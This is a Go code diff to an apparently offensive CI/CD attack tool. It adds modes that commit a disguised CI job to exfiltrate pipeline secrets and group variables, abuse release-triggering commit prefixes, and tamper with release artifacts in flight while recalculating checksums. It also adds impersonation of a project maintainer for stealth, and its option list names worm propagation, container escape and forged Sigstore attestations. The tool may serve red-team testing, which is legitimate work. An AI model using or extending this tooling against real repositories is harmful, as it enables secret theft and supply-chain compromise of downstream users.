@@ -200,6 +200,7 @@ var (
 	atkWormPayload     string // payload to inject into sibling repos
 	atkWormMaxRepos    int    // max sibling repos to propagate to (default: 5)
 	atkWormTargetGroup string // group ID/path to scope worm propagation
+	atkWormMonorepo    bool   // discover siblings via package manifests
 	// Container escape mode (privileged Docker executor exploit)
 	atkContainerEscape bool
 	atkEscapeMountPath string // host path to mount (default: /)
@@ -246,6 +247,22 @@ var (
 	atkSigstore        bool
 	atkSigstorePackage string // package name for attestation
 	atkSigstoreVersion string // package version
+	// Impersonation
+	atkImpersonateMaintainer bool
+	// Workflow exfil mode (stealthy artifact-based secret exfiltration)
+	atkWorkflowExfil     bool
+	atkExfilDisguise     string // disguise job name (default: code-format)
+	atkExfilDumpGroupVar bool   // also dump group-level variables
+	// Commit prefix mode (release trigger abuse via commit message)
+	atkCommitPrefix    bool
+	atkPrefixValue     string // prefix (default: feat:)
+	atkPrefixMessage   string // commit message body
+	// Release tamper pipeline mode (in-flight release artifact tampering)
+	atkReleaseTamperPipeline bool
+	atkRTPTag                string // release tag to target
+	atkRTPArtifact           string // artifact path to tamper
+	atkRTPPayload            string // payload content to prepend
+	atkRTPChecksums          string // checksums file to recalculate
 	// Shared co-author trailer
 	atkCoAuthor string // co-authored-by trailer for commits
 )
@@ -465,8 +482,17 @@ var attackCmd = &cobra.Command{
 			if atkSigstore {
 				modes++
 			}
+			if atkWorkflowExfil {
+				modes++
+			}
+			if atkCommitPrefix {
+				modes++
+			}
+			if atkReleaseTamperPipeline {
+				modes++
+			}
 			if modes != 1 {
-				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, --c2-channel, --npm-tamper, --vault-enum, --k8s-secrets, --dead-man-switch, --branch-mutator, or --sigstore (or use --payload-only or --discover-tags)")
+				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, --c2-channel, --npm-tamper, --vault-enum, --k8s-secrets, --dead-man-switch, --branch-mutator, --sigstore, --workflow-exfil, --commit-prefix, or --release-tamper-pipeline (or use --payload-only or --discover-tags)")
 			}
 		}
 
@@ -2168,6 +2194,132 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
+		// workflow-exfil mode
+		if atkWorkflowExfil {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-exfil"
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add code format check"
+			}
+			yaml := payloadgen.GenerateWorkflowExfilYAML(payloadgen.WorkflowExfilOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				DisguiseName:  strings.TrimSpace(atkExfilDisguise),
+				WebhookURL:    strings.TrimSpace(atkWebhook),
+				DumpGroupVars: atkExfilDumpGroupVar,
+			})
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
+				return fmt.Errorf("commit workflow-exfil payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed workflow-exfil payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch   string `json:"branch"`
+					Disguise string `json:"disguise,omitempty"`
+				}{
+					Branch:   finalBranch,
+					Disguise: strings.TrimSpace(atkExfilDisguise),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Workflow exfil payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// commit-prefix mode
+		if atkCommitPrefix {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-prefix"
+			}
+			commitMsg := payloadgen.GenerateCommitPrefixMessage(payloadgen.CommitPrefixOptions{
+				Prefix:  strings.TrimSpace(atkPrefixValue),
+				Message: strings.TrimSpace(atkPrefixMessage),
+			})
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = commitMsg
+			}
+			yaml := payloadgen.GenerateCommitPrefixYAML(payloadgen.CommitPrefixYAMLOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+			})
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
+				return fmt.Errorf("commit commit-prefix payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed with prefix message %q to branch %s\n", atkMessage, finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch  string `json:"branch"`
+					Message string `json:"commit_message"`
+				}{
+					Branch:  finalBranch,
+					Message: atkMessage,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Commit prefix attack committed to branch %s with message %q", finalBranch, atkMessage))
+			return nil
+		}
+
+		// release-tamper-pipeline mode
+		if atkReleaseTamperPipeline {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-release"
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add release verification step"
+			}
+			yaml := payloadgen.GenerateReleaseTamperPipelineYAML(payloadgen.ReleaseTamperPipelineOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				ReleaseTag:     strings.TrimSpace(atkRTPTag),
+				ArtifactPath:   strings.TrimSpace(atkRTPArtifact),
+				PayloadContent: strings.TrimSpace(atkRTPPayload),
+				ChecksumFile:   strings.TrimSpace(atkRTPChecksums),
+				WebhookURL:     strings.TrimSpace(atkWebhook),
+			})
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
+				return fmt.Errorf("commit release-tamper-pipeline payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed release tamper pipeline payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch     string `json:"branch"`
+					ReleaseTag string `json:"release_tag,omitempty"`
+				}{
+					Branch:     finalBranch,
+					ReleaseTag: strings.TrimSpace(atkRTPTag),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Release tamper pipeline payload committed to branch %s", finalBranch))
+			return nil
+		}
+
 		// secrets mode
 		if atkSecrets {
 			// parse tags
@@ -2572,6 +2724,7 @@ func init() {
 	attackCmd.Flags().StringVar(&atkWormPayload, "worm-payload", "", "Payload to inject into sibling repos")
 	attackCmd.Flags().IntVar(&atkWormMaxRepos, "worm-max-repos", 5, "Max sibling repos to propagate to")
 	attackCmd.Flags().StringVar(&atkWormTargetGroup, "worm-target-group", "", "Group ID/path to scope worm propagation")
+	attackCmd.Flags().BoolVar(&atkWormMonorepo, "monorepo-scope", false, "Discover sibling packages via manifests (npm @scope/*, go.mod, Cargo.toml)")
 	// Container escape mode flags
 	attackCmd.Flags().BoolVar(&atkContainerEscape, "container-escape", false, "Exploit privileged Docker executor to escape to host")
 	attackCmd.Flags().StringVar(&atkEscapeMountPath, "escape-mount-path", "/", "Host path to mount (default: /)")
@@ -2618,6 +2771,22 @@ func init() {
 	attackCmd.Flags().BoolVar(&atkSigstore, "sigstore", false, "Forge Sigstore provenance attestations via CI OIDC tokens")
 	attackCmd.Flags().StringVar(&atkSigstorePackage, "sigstore-package", "", "Package name for the attestation subject")
 	attackCmd.Flags().StringVar(&atkSigstoreVersion, "sigstore-version", "", "Package version for the attestation")
+	// Impersonation flag
+	attackCmd.Flags().BoolVar(&atkImpersonateMaintainer, "impersonate-maintainer", false, "Auto-populate git author from a project maintainer (stealth)")
+	// Workflow exfil mode flags
+	attackCmd.Flags().BoolVar(&atkWorkflowExfil, "workflow-exfil", false, "Commit a stealthy CI job that exfiltrates secrets via artifacts (Hades campaign technique)")
+	attackCmd.Flags().StringVar(&atkExfilDisguise, "exfil-disguise", "", "Disguise job name (default: code-format)")
+	attackCmd.Flags().BoolVar(&atkExfilDumpGroupVar, "exfil-dump-group-vars", false, "Also dump group-level CI variables")
+	// Commit prefix mode flags
+	attackCmd.Flags().BoolVar(&atkCommitPrefix, "commit-prefix", false, "Commit with a release-triggering prefix to abuse automated release workflows (AsyncAPI technique)")
+	attackCmd.Flags().StringVar(&atkPrefixValue, "prefix", "", "Commit message prefix (default: feat:)")
+	attackCmd.Flags().StringVar(&atkPrefixMessage, "prefix-message", "", "Commit message body (default: update dependency versions)")
+	// Release tamper pipeline mode flags
+	attackCmd.Flags().BoolVar(&atkReleaseTamperPipeline, "release-tamper-pipeline", false, "Inject a CI job to tamper with release artifacts in-flight")
+	attackCmd.Flags().StringVar(&atkRTPTag, "rtp-tag", "", "Release tag to target (default: $CI_COMMIT_TAG)")
+	attackCmd.Flags().StringVar(&atkRTPArtifact, "rtp-artifact", "", "Artifact path to tamper")
+	attackCmd.Flags().StringVar(&atkRTPPayload, "rtp-payload", "", "Payload content to prepend to artifact")
+	attackCmd.Flags().StringVar(&atkRTPChecksums, "rtp-checksums", "", "Checksums file to recalculate after tampering")
 	// Shared co-author trailer
 	attackCmd.Flags().StringVar(&atkCoAuthor, "co-author", "", "Co-Authored-By trailer for commits")
 }
@@ -2830,6 +2999,30 @@ func renderPayload() (string, error) {
 			PackageName: strings.TrimSpace(atkSigstorePackage),
 			Version:     strings.TrimSpace(atkSigstoreVersion),
 			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "workflow-exfil", "workflow_exfil", "workflowexfil":
+		return payloadgen.GenerateWorkflowExfilYAML(payloadgen.WorkflowExfilOptions{
+			Common:        common,
+			DisguiseName:  strings.TrimSpace(atkExfilDisguise),
+			WebhookURL:    strings.TrimSpace(atkWebhook),
+			DumpGroupVars: atkExfilDumpGroupVar,
+		}), nil
+	case "commit-prefix", "commit_prefix", "commitprefix":
+		return payloadgen.GenerateCommitPrefixYAML(payloadgen.CommitPrefixYAMLOptions{
+			Common: common,
+			Prefix: payloadgen.CommitPrefixOptions{
+				Prefix:  strings.TrimSpace(atkPrefixValue),
+				Message: strings.TrimSpace(atkPrefixMessage),
+			},
+		}), nil
+	case "release-tamper-pipeline", "release_tamper_pipeline", "releasetamperpipeline":
+		return payloadgen.GenerateReleaseTamperPipelineYAML(payloadgen.ReleaseTamperPipelineOptions{
+			Common:         common,
+			ReleaseTag:     strings.TrimSpace(atkRTPTag),
+			ArtifactPath:   strings.TrimSpace(atkRTPArtifact),
+			PayloadContent: strings.TrimSpace(atkRTPPayload),
+			ChecksumFile:   strings.TrimSpace(atkRTPChecksums),
+			WebhookURL:     strings.TrimSpace(atkWebhook),
 		}), nil
 	default:
 		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
